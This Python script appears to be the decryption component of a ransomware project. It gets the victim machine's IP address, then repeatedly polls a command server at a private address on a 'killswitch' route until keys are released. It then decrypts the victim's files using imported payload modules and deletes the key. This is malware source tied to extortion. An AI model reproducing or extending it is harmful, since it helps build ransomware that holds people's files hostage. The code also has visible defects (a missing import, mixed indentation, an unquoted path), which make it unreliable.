import requests
import os,platform,subprocess,re
import aes_decryption_for_linux as aesl
import aes_decryption_for_windows as aesw
import windows_payload as win
import linux_payload as linux
cipher_text = open('res/key.txt.y4h','rb').read()
cipher = cipher_text.decode()
del cipher_text
if(platform.system() == 'Windows'):
    method = 1
    cmd = "ipconfig"
    cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    temp = re.findall('IPv4 Address.+: (.+)',cmd.stdout.read().decode())
    ip = temp[len(temp)-1].rstrip()
elif(platform.system() == 'Linux'):
    method = 2
    cmd = 'ifconfig'
    cmd = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    temp =  re.findall('inet \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}',cmd.stdout.read().decode())
    temp = temp[0].split(" ")
    temp = temp[1].rstrip()
    ip = temp
while(True):
    res = requests.get('http://172.16.0.6:5000/killswtich/'+ip+'/'+cipher)
    res = res.json()
    if(res['status'] == 'fuck off'):
        time.sleep(5)
        continue
    else:
        open('res/key.txt','wb').write(res['keys'])
        if(method == 1):
            onlyfiles=win.find_file(2)
	    for file in onlyfiles:
		aesw.aes_decrypt(file,2)
	    os.remove(res/key.txt)
	    break
        elif(method == 2):
            onlyfiles = linux.d_main(2)
            for file in onlyfiles:
                aesl.aes_decrypt(file,1)
            os.remove('res/key.txt')
            break
